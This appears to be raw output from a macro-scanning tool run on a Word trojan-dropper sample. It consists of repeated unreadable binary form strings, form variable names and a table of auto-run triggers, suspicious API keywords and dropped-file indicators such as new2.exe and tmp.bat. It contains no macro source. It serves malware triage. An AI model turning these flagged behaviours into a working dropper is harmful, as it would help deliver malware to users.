-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM Variable "b'MultiPage1'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "None" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page2'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page3'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page4'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page5'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image8'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image6'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image3'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image4'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image7'" IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |MultiPage1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecuteA       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|CreateThread        |May inject code into another process         |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Gdi32.dll           |Executable file name                         |
|IOC       |Shell32.dll         |Executable file name                         |
|IOC       |new2.exe            |Executable file name                         |
|IOC       |KERNEL32.DLL        |Executable file name                         |
|IOC       |tmp.bat             |Executable file name                         |
|IOC       |services.exe        |Executable file name                         |
|IOC       |SHELL32.dll         |Executable file name                         |
|IOC       |KERNEL32.dll        |Executable file name                         |
|IOC       |USER32.dll          |Executable file name                         |
|IOC       |WININET.dll         |Executable file name                         |
|IOC       |OLEAUT32.dll        |Executable file name                         |
|IOC       |ole32.dll           |Executable file name                         |
|IOC       |ADVAPI32.dll        |Executable file name                         |
|Hex String|""""""""""""""""""""|222222222222222222222222222222222222222222222|
|          |"""""               |22222                                        |
+----------+--------------------+---------------------------------------------+

